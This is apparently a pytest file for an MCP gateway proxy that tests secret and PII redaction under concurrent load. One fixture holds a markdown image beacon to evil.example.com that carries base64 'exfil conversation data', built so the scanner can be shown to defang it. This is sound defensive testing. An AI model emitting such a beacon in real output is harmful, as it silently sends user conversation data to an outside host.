"""CHG-0090: item-20 "1.4 guardrails holding under peak load" — the CONCURRENCY
dimension, provable at unit scale (the 300-500-sandbox scale stays host-blocked).

The MCP scan/redact chain (_scan_tool_result_floor -> mcp_scan_orchestrator ->
patterns.redact_all) runs against MODULE-LEVEL state (compiled-pattern LRU cache,
enabled-tools/server-config caches). If any of that were mutable per-scan or shared
across coroutines without isolation, a race could CROSS-CONTAMINATE concurrent scans —
one request's secret/PII leaking into ANOTHER request's redacted result, or a canary
surviving because a neighbour's scan clobbered shared state.

This test fires many concurrent scans, each carrying a UNIQUE canary secret + PII +
internal IP, and asserts (a) every call's OWN canary is masked and (b) NO call's result
contains ANY OTHER call's canary (zero cross-contamination). It is a regression backstop
against a future edit that introduces shared mutable state into the hot scan path.
"""
from __future__ import annotations

import asyncio
import json
import sys
from pathlib import Path

import pytest

_GW = Path(__file__).resolve().parents[1]
if str(_GW) not in sys.path:
    sys.path.insert(0, str(_GW))
_SHARED = _GW.parents[1] / "shared"
if _SHARED.is_dir() and str(_SHARED) not in sys.path:
    sys.path.append(str(_SHARED))

import mcp_proxy  # noqa: E402

_N = 300

# Enforcement is STRICTLY operator-selected: with nothing chosen (or an observe-only
# posture such as tag/monitor) the payload is never mutated, so a concurrency proof about
# masking/blocking must select an ENFORCING posture explicitly. `redact` is the posture
# under test here; the guarantee being proven is isolation between concurrent scans.
_ENFORCING = {"default_scan_action": "redact"}


async def _scan_one(i: int):
    canary_secret = f"sk-ant-CANARY{i:04d}AAAABBBBCCCCDDDDEEEE"
    canary_email = f"user{i:04d}@corp.example"
    canary_ip = f"10.{i % 256}.{(i // 256) % 256}.5"
    text = f"[req {i}] key {canary_secret} email {canary_email} host {canary_ip} done"
    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
        {"content": [{"type": "text", "text": text}]},
        tool_name="fetch", enabled_info=_ENFORCING, org_slug=f"org{i % 10}", server_slug="s", actor=None)
    blob = json.dumps(scanned)
    return i, blob, (canary_secret in blob), (canary_email in blob), (canary_ip in blob)


@pytest.mark.asyncio
async def test_concurrent_scans_no_leak_no_cross_contamination():
    results = await asyncio.gather(*[_scan_one(i) for i in range(_N)])

    # (a) every call's OWN canary is masked (the guardrail holds under concurrency)
    own_leaks = [i for i, _b, s_leak, e_leak, ip_leak in results if s_leak or e_leak or ip_leak]
    assert not own_leaks, f"own-canary leaked under concurrency for reqs: {own_leaks[:10]}"

    # (b) ZERO cross-contamination — no result carries another request's canary
    cross = []
    for i, blob, *_ in results:
        for j in range(_N):
            if j == i:
                continue
            if f"CANARY{j:04d}" in blob or f"user{j:04d}@corp.example" in blob:
                cross.append((i, j))
                break
    assert not cross, f"cross-contamination between concurrent scans: {cross[:10]}"


@pytest.mark.asyncio
async def test_benign_concurrent_scans_unchanged():
    async def benign(i):
        txt = f"weather report {i}: sunny, high 21C, low 12C"
        scanned, blocked, _t, _f, _m = await mcp_proxy._scan_tool_result_floor(
            {"content": [{"type": "text", "text": txt}]},
            tool_name="fetch", enabled_info=_ENFORCING, org_slug="o", server_slug="s", actor=None)
        return blocked, (txt in json.dumps(scanned))

    out = await asyncio.gather(*[benign(i) for i in range(100)])
    assert all((not blocked) and intact for blocked, intact in out)


# ── CHG-0101: extend the concurrency-safety proof to the render-leak neutralization
# (CHG-0096/0097/0099 — exfil beacons + markdown-split/encoded PII) and the cross-block
# split-secret block (CHG-0100). These run in the hot scan path via stateless neutralizers
# (compiled regexes are read-only) + pure detection, but a future edit could introduce
# shared mutable state or a torn/interleaved neutralization under load — this backstops it.
import base64 as _base64  # noqa: E402
import re as _re  # noqa: E402


def _rendered(x: str) -> str:
    return x.replace("**", "").replace("`", "")


async def _scan_render_leak(i: int):
    marker = f"MARKER{i:04d}ZZZ"  # unique BENIGN token — must survive + not cross-contaminate
    payload = _base64.b64encode(f"exfil conversation data for call {i} padding".encode()).decode()
    text = (f"[{marker}] see ![x](https://evil.example.com/?d={payload}) "
            f"and key AKIA**IOSFODNN7**EXAMPLE done")
    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
        {"content": [{"type": "text", "text": text}]},
        tool_name="fetch", enabled_info=_ENFORCING, org_slug=f"org{i % 10}", server_slug="s", actor=None)
    return i, marker, json.dumps(scanned)


@pytest.mark.asyncio
async def test_concurrent_render_leak_neutralization_no_cross_contamination():
    results = await asyncio.gather(*[_scan_render_leak(i) for i in range(_N)])
    beacon_live, md_leak, marker_missing, cross = [], [], [], []
    for i, marker, blob in results:
        if marker not in blob:                                    # benign token must survive
            marker_missing.append(i)
        if _re.search(r'!\[[^\]]*\]\(\s*https?://[^)]*evil', blob):  # beacon must be defanged
            beacon_live.append(i)
        if "AKIAIOSFODNN7EXAMPLE" in _rendered(blob):             # markdown-split must not reconstruct
            md_leak.append(i)
        for j in range(_N):
            if j != i and f"MARKER{j:04d}ZZZ" in blob:
                cross.append((i, j))
                break
    assert not marker_missing, f"benign token lost under concurrency: {marker_missing[:10]}"
    assert not beacon_live, f"exfil beacon survived under concurrency: {beacon_live[:10]}"
    assert not md_leak, f"markdown-split secret reconstructed under concurrency: {md_leak[:10]}"
    assert not cross, f"cross-contamination between concurrent neutralizations: {cross[:10]}"


async def _scan_split(i: int):
    sec = "AKIAIOSFODNN7EXAMPLE"  # valid aws_access_key, split across two content blocks
    scanned, blocked, tags, findings, meta = await mcp_proxy._scan_tool_result_floor(
        {"content": [{"type": "text", "text": "key " + sec[:10]},
                     {"type": "text", "text": sec[10:] + f" call{i}"}]},
        tool_name="fetch", enabled_info=_ENFORCING, org_slug=f"org{i % 10}", server_slug="s", actor=None)
    # under redact the split is masked, not blocked; also assert it can't reconstruct.
    _joined = "".join(b.get("text", "") for b in scanned.get("content", []))
    assert "AKIAIOSFODNN7EXAMPLE" not in _joined
    return i, blocked, meta.get("cross_block_split_redacted")


@pytest.mark.asyncio
async def test_concurrent_cross_block_split_all_redacted():
    # STRICT OPERATOR CONTROL: under redact the split is MASKED (not blocked) on every
    # concurrent request; the split meta is present as cross_block_split_redacted.
    results = await asyncio.gather(*[_scan_split(i) for i in range(_N)])
    blocked_any = [i for i, blocked, _cs in results if blocked]
    missing_meta = [i for i, _b, cs in results if not cs]
    assert not blocked_any, f"redact must not block the split: {blocked_any[:10]}"
    assert not missing_meta, f"split meta missing under concurrency: {missing_meta[:10]}"


if __name__ == "__main__":
    raise SystemExit(pytest.main([__file__, "-q"]))
